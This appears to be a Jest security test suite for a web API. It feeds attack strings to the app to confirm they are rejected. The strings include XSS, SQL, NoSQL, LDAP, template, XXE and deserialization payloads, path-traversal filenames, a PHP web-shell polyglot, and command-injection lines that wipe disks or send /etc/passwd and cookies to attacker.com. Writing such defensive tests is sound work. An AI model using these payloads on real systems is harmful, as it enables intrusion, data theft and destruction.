const request = require('supertest');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');

// Mock the database
jest.mock('../src/config/database', () => ({
  initializeDatabase: jest.fn().mockResolvedValue(true),
  runQuery: jest.fn(),
  getQuery: jest.fn(),
  allQuery: jest.fn()
}));

const createTestApp = require('./testApp');
const app = createTestApp();

describe('Input Validation Bypass and Injection Attack Tests', () => {
  let authToken, adminToken;

  beforeAll(() => {
    authToken = jwt.sign(
      { id: 1, email: 'test@example.com', role: 'farmer' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    adminToken = jwt.sign(
      { id: 2, email: 'admin@example.com', role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Advanced XSS Attack Vectors', () => {
    describe('Stored XSS Attempts', () => {
      it('should prevent stored XSS in user profiles', async () => {
        const xssPayloads = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          '<svg onload="alert(1)">',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<object data="javascript:alert(1)"></object>',
          '<embed src="javascript:alert(1)">',
          '<link rel="stylesheet" href="javascript:alert(1)">',
          '<style>@import"javascript:alert(1)";</style>',
          '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
          '"><script>alert(1)</script>',
          '\'"--><script>alert(1)</script>',
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
          'vbscript:alert(1)',
          '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
          '<img src="/" onerror="document.location=\'http://attacker.com/steal.php?cookie=\'+document.cookie">',
          '<div onmouseover="alert(1)">Hover me</div>',
          '<input onfocus="alert(1)" autofocus>',
          '<select onfocus="alert(1)" autofocus><option>test</option></select>',
          '<textarea onfocus="alert(1)" autofocus></textarea>'
        ];

        for (const payload of xssPayloads) {
          const response = await request(app)
            .put('/api/auth/profile')
            .set('Authorization', `Bearer ${authToken}`)
            .send({
              name: payload,
              location: payload,
              bio: payload
            });

          expect(response.status).toBe(400);
          if (response.body.success !== false) {
            // If it's accepted, check that the payload is sanitized
            expect(JSON.stringify(response.body)).not.toContain('<script>');
            expect(JSON.stringify(response.body)).not.toContain('javascript:');
            expect(JSON.stringify(response.body)).not.toContain('onerror');
            expect(JSON.stringify(response.body)).not.toContain('onload');
          }
        }
      });

      it('should prevent XSS in analysis comments', async () => {
        const complexXssPayloads = [
          '<img src="x" onerror="fetch(\'http://attacker.com\', {method: \'POST\', body: document.cookie})">',
          '<div style="width: expression(alert(1))">',
          '<div style="background: url(javascript:alert(1))">',
          '<div style="behavior: url(xss.htc)">',
          '<!--[if IE]><script>alert(1)</script><![endif]-->',
          '<xml><i><b>&lt;img src=1 onerror=alert(1)&gt;</b></i></xml>',
          '<![CDATA[<script>alert(1)</script>]]>',
          '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
          '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
        ];

        for (const payload of complexXssPayloads) {
          const response = await request(app)
            .post('/api/analysis/999/comment')
            .set('Authorization', `Bearer ${authToken}`)
            .send({
              comment: payload,
              rating: 5
            });

          expect([400, 404]).toContain(response.status);
          if (response.status !== 400) {
            expect(JSON.stringify(response.body)).not.toContain('javascript:');
            expect(JSON.stringify(response.body)).not.toContain('onerror');
            expect(JSON.stringify(response.body)).not.toContain('onbegin');
          }
        }
      });
    });

    describe('Reflected XSS Attempts', () => {
      it('should prevent reflected XSS in search parameters', async () => {
        const reflectedXssPayloads = [
          '<script>alert(document.domain)</script>',
          '"><script>alert(1)</script>',
          '\'"--><script>alert(1)</script>',
          '</script><script>alert(1)</script>',
          '<img src="x" onerror="alert(1)">',
          '<svg onload="alert(1)">',
          'javascript:alert(1)',
          '&lt;script&gt;alert(1)&lt;/script&gt;',
          '%3Cscript%3Ealert(1)%3C/script%3E',
          '<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>'
        ];

        for (const payload of reflectedXssPayloads) {
          const response = await request(app)
            .get('/api/analysis/history')
            .set('Authorization', `Bearer ${authToken}`)
            .query({
              search: payload,
              filter: payload,
              sort: payload
            });

          expect([400, 200]).toContain(response.status);
          
          // Check that the payload is not reflected in the response
          const responseBody = JSON.stringify(response.body);
          expect(responseBody).not.toContain('<script>');
          expect(responseBody).not.toContain('javascript:');
          expect(responseBody).not.toContain('onerror');
          expect(responseBody).not.toContain('onload');
        }
      });

      it('should prevent XSS in error messages', async () => {
        const errorXssPayloads = [
          '<script>alert("Error XSS")</script>',
          '"><img src="x" onerror="alert(1)">',
          '\'; alert(1); //'
        ];

        for (const payload of errorXssPayloads) {
          const response = await request(app)
            .get(`/api/nonexistent/${payload}`)
            .set('Authorization', `Bearer ${authToken}`);

          const responseBody = JSON.stringify(response.body);
          expect(responseBody).not.toContain('<script>');
          expect(responseBody).not.toContain('onerror');
          expect(responseBody).not.toContain('alert');
        }
      });
    });

    describe('DOM-based XSS Prevention', () => {
      it('should sanitize data attributes that could be used for DOM XSS', async () => {
        const domXssPayloads = [
          'data:text/html,<script>alert(1)</script>',
          'javascript:void(0);alert(1)',
          'data:application/javascript,alert(1)',
          'vbscript:alert(1)',
          'livescript:alert(1)',
          'mocha:alert(1)',
          'charset=utf-7;+ADw-script+AD4-alert(1)+ADw-/script+AD4-'
        ];

        for (const payload of domXssPayloads) {
          const response = await request(app)
            .put('/api/auth/profile')
            .set('Authorization', `Bearer ${authToken}`)
            .send({
              avatar_url: payload,
              website: payload
            });

          expect([400, 200]).toContain(response.status);
          if (response.status === 200) {
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('javascript:');
            expect(responseBody).not.toContain('vbscript:');
            expect(responseBody).not.toContain('data:text/html');
          }
        }
      });
    });
  });

  describe('Advanced SQL Injection Attacks', () => {
    describe('Union-based SQL Injection', () => {
      it('should prevent UNION SELECT attacks', async () => {
        const unionPayloads = [
          "' UNION SELECT username, password FROM admin_users--",
          "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
          "' UNION ALL SELECT NULL,NULL,NULL--",
          "' UNION SELECT LOAD_FILE('/etc/passwd')--",
          "' UNION SELECT @@version,@@datadir--",
          "') UNION SELECT * FROM users WHERE 1=1#",
          "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--",
          "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--"
        ];

        for (const payload of unionPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'test'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
          expect(response.body.error).toBe('Invalid Request');
        }
      });

      it('should prevent blind SQL injection with time delays', async () => {
        const blindSqlPayloads = [
          "'; WAITFOR DELAY '00:00:05'--",
          "'; SELECT SLEEP(5)--",
          "'; SELECT pg_sleep(5)--",
          "' OR (SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1)='a')>0 AND SLEEP(5)--",
          "' AND (SELECT COUNT(*) FROM users)>0 AND BENCHMARK(5000000,MD5(1))--",
          "'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--"
        ];

        for (const payload of blindSqlPayloads) {
          const start = Date.now();
          const response = await request(app)
            .get('/api/analysis/history')
            .set('Authorization', `Bearer ${authToken}`)
            .query({ search: payload });

          const duration = Date.now() - start;
          
          expect(response.status).toBe(400);
          expect(response.body.error).toBe('Invalid Request');
          // Should not cause time delays
          expect(duration).toBeLessThan(1000);
        }
      });
    });

    describe('Error-based SQL Injection', () => {
      it('should prevent error-based information disclosure', async () => {
        const errorBasedPayloads = [
          "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2)))--",
          "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
          "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
          "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(COUNT(*) AS CHAR),0x7e)) FROM information_schema.tables WHERE table_schema=0x696e666f726d6174696f6e5f736368656d61),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ];

        for (const payload of errorBasedPayloads) {
          const response = await request(app)
            .get('/api/users/search')
            .set('Authorization', `Bearer ${adminToken}`)
            .query({ q: payload });

          expect([400, 404]).toContain(response.status);
          if (response.body.error) {
            // Should not expose database version or structure
            const errorMessage = JSON.stringify(response.body);
            expect(errorMessage).not.toContain('mysql');
            expect(errorMessage).not.toContain('sqlite');
            expect(errorMessage).not.toContain('postgres');
            expect(errorMessage).not.toContain('information_schema');
          }
        }
      });
    });

    describe('Boolean-based Blind SQL Injection', () => {
      it('should prevent boolean-based blind SQL injection', async () => {
        const booleanPayloads = [
          "' AND 1=1--",
          "' AND 1=2--",
          "' AND 'a'='a'--",
          "' AND 'a'='b'--",
          "' AND SUBSTRING(version(),1,1)='5'--",
          "' AND LENGTH(version())>10--",
          "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50--"
        ];

        for (const payload of booleanPayloads) {
          const response = await request(app)
            .get('/api/analysis/history')
            .set('Authorization', `Bearer ${authToken}`)
            .query({ filter: payload });

          expect(response.status).toBe(400);
          expect(response.body.error).toBe('Invalid Request');
        }
      });
    });
  });

  describe('Advanced File Upload Attack Vectors', () => {
    describe('Malicious File Upload Attempts', () => {
      it('should prevent executable file uploads with double extensions', async () => {
        const dangerousFilenames = [
          'innocent.jpg.exe',
          'image.png.bat',
          'photo.gif.cmd',
          'picture.webp.scr',
          'upload.jpeg.js',
          'file.png.vbs',
          'image.jpg.php',
          'photo.gif.jsp',
          'picture.png.aspx',
          'upload.webp.sh'
        ];

        for (const filename of dangerousFilenames) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', Buffer.from('fake image data'), filename);

          expect(response.status).toBe(400);
          expect(response.body.error).toBe('File Not Allowed');
        }
      });

      it('should prevent polyglot file attacks', async () => {
        // Create a file that looks like an image but contains executable code
        const polyglotFiles = [
          {
            name: 'polyglot.jpg',
            content: Buffer.concat([
              Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // JPEG header
              Buffer.from('<?php system($_GET["cmd"]); ?>'), // PHP code
              Buffer.from([0xFF, 0xD9]) // JPEG footer
            ])
          },
          {
            name: 'polyglot.png',
            content: Buffer.concat([
              Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]), // PNG header
              Buffer.from('<script>alert("XSS")</script>'), // JavaScript
              Buffer.from([0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]) // PNG footer
            ])
          }
        ];

        for (const file of polyglotFiles) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', file.content, file.name);

          // Should either reject or sanitize the file
          expect([400, 200]).toContain(response.status);
          if (response.status === 400) {
            expect(response.body.success).toBe(false);
          }
        }
      });

      it('should prevent zip bomb attacks through file uploads', async () => {
        // Create a highly compressed file that expands to a large size
        const zipBomb = Buffer.alloc(1024 * 1024); // 1MB of zeros (highly compressible)
        zipBomb.fill(0);

        const response = await request(app)
          .post('/api/analysis/analyze')
          .set('Authorization', `Bearer ${authToken}`)
          .attach('image', zipBomb, 'bomb.jpg');

        expect([400, 413]).toContain(response.status);
      });

      it('should validate file content matches extension', async () => {
        const mismatchedFiles = [
          { name: 'fake.jpg', content: 'This is actually a text file', mimetype: 'image/jpeg' },
          { name: 'fake.png', content: '<html><body>HTML content</body></html>', mimetype: 'image/png' },
          { name: 'fake.webp', content: 'PDF-like content here', mimetype: 'image/webp' }
        ];

        for (const file of mismatchedFiles) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', Buffer.from(file.content), file.name);

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });

    describe('Path Traversal in File Operations', () => {
      it('should prevent directory traversal in file downloads', async () => {
        const traversalPaths = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/etc/shadow',
          'C:\\windows\\system32\\config\\system',
          '....//....//....//etc/passwd',
          '..%2f..%2f..%2fetc%2fpasswd',
          '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',
          '....%2f....%2f....%2fetc%2fpasswd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];

        for (const path of traversalPaths) {
          const response = await request(app)
            .get(`/api/analysis/download/${encodeURIComponent(path)}`)
            .set('Authorization', `Bearer ${authToken}`);

          expect([400, 403, 404]).toContain(response.status);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent path traversal in file uploads', async () => {
        const maliciousFilenames = [
          '../../../malicious.php',
          '..\\..\\..\\malicious.exe',
          '/var/www/html/shell.php',
          'C:\\inetpub\\wwwroot\\backdoor.aspx',
          '....//....//uploads//shell.php'
        ];

        for (const filename of maliciousFilenames) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .attach('image', Buffer.from('fake content'), filename);

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('NoSQL Injection Attacks', () => {
    describe('MongoDB-style Injection', () => {
      it('should prevent NoSQL operator injection', async () => {
        const noSqlPayloads = [
          { $ne: null },
          { $gt: '' },
          { $regex: '.*' },
          { $where: 'function() { return true; }' },
          { $expr: { $gt: ['$balance', 100] } },
          { $lookup: { from: 'users', localField: '_id', foreignField: 'userId', as: 'userData' } },
          { $or: [{ deleted: false }, { admin: true }] },
          { $and: [{ active: true }, { role: 'admin' }] }
        ];

        for (const payload of noSqlPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'test123'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent NoSQL injection in query parameters', async () => {
        const noSqlQueryPayloads = [
          '{"$ne": null}',
          '{"$gt": ""}',
          '{"$regex": ".*"}',
          '{"$where": "function() { return true; }"}',
          '{"admin": true}',
          '{"$or": [{"deleted": false}, {"admin": true}]}'
        ];

        for (const payload of noSqlQueryPayloads) {
          const response = await request(app)
            .get('/api/analysis/history')
            .set('Authorization', `Bearer ${authToken}`)
            .query({ filter: payload });

          expect(response.status).toBe(400);
          expect(response.body.error).toBe('Invalid Request');
        }
      });
    });
  });

  describe('LDAP Injection Attacks', () => {
    describe('LDAP Filter Injection', () => {
      it('should prevent LDAP injection in authentication', async () => {
        const ldapPayloads = [
          '*)(uid=*',
          '*)(|(uid=*',
          '*)(&(uid=*',
          '*))%00',
          '*)(objectClass=*',
          '*)(cn=*',
          '*)(|(objectClass=*)(cn=*',
          '*)(|(&(objectClass=user)(!(cn=admin)))(objectClass=*'
        ];

        for (const payload of ldapPayloads) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: `user${payload}@example.com`,
              password: 'password123'
            });

          expect(response.status).toBe(400);
          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('Command Injection Prevention', () => {
    describe('OS Command Injection', () => {
      it('should prevent command injection in image processing', async () => {
        const commandPayloads = [
          '; rm -rf /',
          '&& cat /etc/passwd',
          '| nc attacker.com 4444',
          '`whoami`',
          '$(id)',
          '; wget http://attacker.com/malware.sh; sh malware.sh',
          '&& curl -X POST -d @/etc/passwd http://attacker.com/exfil',
          '; python -c "import os; os.system(\'rm -rf /\')"',
          '&& powershell -Command "Get-Content C:\\Windows\\System32\\config\\SAM"'
        ];

        for (const payload of commandPayloads) {
          const response = await request(app)
            .post('/api/analysis/analyze')
            .set('Authorization', `Bearer ${authToken}`)
            .field('options', payload)
            .attach('image', Buffer.from('fake image'), 'test.jpg');

          expect([400, 422]).toContain(response.status);
          expect(response.body.success).toBe(false);
        }
      });

      it('should prevent command injection in file operations', async () => {
        const fileCommandPayloads = [
          'test.jpg; rm -rf /',
          'image.png && cat /etc/passwd',
          'photo.gif | nc evil.com 4444',
          'picture.webp`whoami`',
          'upload.jpeg$(uname -a)'
        ];

        for (const payload of fileCommandPayloads) {
          const response = await request(app)
            .get(`/api/analysis/download/${encodeURIComponent(payload)}`)
            .set('Authorization', `Bearer ${authToken}`);

          expect([400, 403, 404]).toContain(response.status);
          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('Template Injection Attacks', () => {
    describe('Server-Side Template Injection', () => {
      it('should prevent template injection in dynamic content', async () => {
        const templatePayloads = [
          '{{7*7}}',
          '${7*7}',
          '<%=7*7%>',
          '<%= system("id") %>',
          '{{config.items()}}',
          '{{request.application.__globals__.__builtins__.__import__("os").system("id")}}',
          '${T(java.lang.System).getProperty("user.name")}',
          '#{7*7}',
          '{%for x in ().__class__.__base__.__subclasses__()%}{%if "warning" in x.__name__%}{{x()._module.__builtins__["__import__"]("os").system("id")}}{%endif%}{%endfor%}'
        ];

        for (const payload of templatePayloads) {
          const response = await request(app)
            .put('/api/auth/profile')
            .set('Authorization', `Bearer ${authToken}`)
            .send({
              name: payload,
              bio: payload
            });

          expect([400, 200]).toContain(response.status);
          if (response.status === 200) {
            // Should not execute template code
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('49'); // 7*7 = 49
            expect(responseBody).not.toContain('root');
            expect(responseBody).not.toContain('uid=');
          }
        }
      });
    });
  });

  describe('XML/XXE Injection Attacks', () => {
    describe('XML External Entity Injection', () => {
      it('should prevent XXE attacks in XML uploads', async () => {
        const xxePayloads = [
          `<?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
          <root>&xxe;</root>`,
          
          `<?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>
          <root>&xxe;</root>`,
          
          `<?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
          <root></root>`,
          
          `<?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
          <root></root>`
        ];

        for (const payload of xxePayloads) {
          const response = await request(app)
            .post('/api/analysis/upload-metadata')
            .set('Authorization', `Bearer ${authToken}`)
            .set('Content-Type', 'application/xml')
            .send(payload);

          expect([400, 415]).toContain(response.status);
          expect(response.body.success).toBe(false);
        }
      });
    });
  });

  describe('Deserialization Attacks', () => {
    describe('Unsafe Deserialization', () => {
      it('should prevent malicious object deserialization', async () => {
        const maliciousObjects = [
          'O:8:"PharData":1:{s:8:"fileName";s:20:"/etc/passwd";}',
          'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==',
          '{"__class__": "subprocess.Popen", "args": [["id"]]}',
          '{"$type": "System.Diagnostics.Process", "StartInfo": {"FileName": "cmd.exe", "Arguments": "/c id"}}'
        ];

        for (const payload of maliciousObjects) {
          const response = await request(app)
            .post('/api/analysis/upload-config')
            .set('Authorization', `Bearer ${authToken}`)
            .send({ config: payload });

          expect([400, 404]).toContain(response.status);
          if (response.body.success !== undefined) {
            expect(response.body.success).toBe(false);
          }
        }
      });
    });
  });
});